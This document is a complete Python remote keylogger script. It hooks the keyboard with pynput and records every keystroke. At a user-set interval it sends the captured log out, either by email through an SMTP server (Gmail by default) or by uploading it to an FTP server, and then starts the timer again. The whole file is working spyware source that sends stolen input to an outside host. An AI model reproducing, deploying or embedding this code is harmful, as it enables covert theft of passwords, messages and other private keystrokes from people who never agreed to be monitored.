#!/usr/bin/env python

import argparse
from datetime import datetime
import ftplib
import io
from pynput.keyboard import Listener, Key, KeyCode
import smtplib
import sys
import threading
from typing import Optional

parser = argparse.ArgumentParser()
parser.add_argument("mode", choices=["ftp", "smtp"])
parser.add_argument("login", help="Username for FTP/email for SMTP")
parser.add_argument("password", help="Password for FTP user/email account")
parser.add_argument(
    "-s", "--server", help="Required for FTP (default smtp.gmail.com for SMTP)"
)
parser.add_argument(
    "-t",
    "--time",
    type=int,
    help="time interval required seconds like -t 60",
    required=True,
)
parser.add_argument(
    "-p",
    "--port",
    type=int,
    help="Port to connect to (default 21 for FTP, OS-dependent for SMTP)",
)
args = parser.parse_args()

mode = args.mode
login = args.login
password = args.password
time_interval = args.time
port: Optional[int] = args.port

if args.server:
    server = args.server
elif args.mode == "smtp":
    server = "smtp.gmail.com"
else:
    print("--server required for FTP", file=sys.stderr)
    exit(1)


class Keylogger:
    def __init__(self):
        self.log = "Keylogger Started"

    def process_key_press(self, key: Optional[Key | KeyCode]):
        if key is None:
            return
        if isinstance(key, KeyCode):
            if key == Key.space:
                self.log += " "
            elif key == Key.tab:
                self.log += "\t"
            elif key.char is not None:
                self.log += key.char
            else:
                self.log += f"[{key}]"
        else:
            self.log += f"[{key}]"

    def report(self):
        print(self.log)
        if mode == "smtp":
            with smtplib.SMTP("smtp.gmail.com", port=port or 0) as smtp:
                smtp.starttls()
                smtp.login(login, password)
                smtp.sendmail(login, login, "\n\n" + self.log)
        else:
            with ftplib.FTP() as ftp:
                ftp.connect(server, port=port or 0)
                ftp.login(user=login, passwd=password)
                ftp.mkd("storage")
                ftp.cwd("storage")
                now = datetime.now()
                ftp.storbinary(f"STOR {now.isoformat()}", io.BytesIO(self.log.encode()))
        self.log = ""
        timer = threading.Timer(time_interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


print("Remote KeyLogger Running....")
keylogger = Keylogger()
keylogger.start()
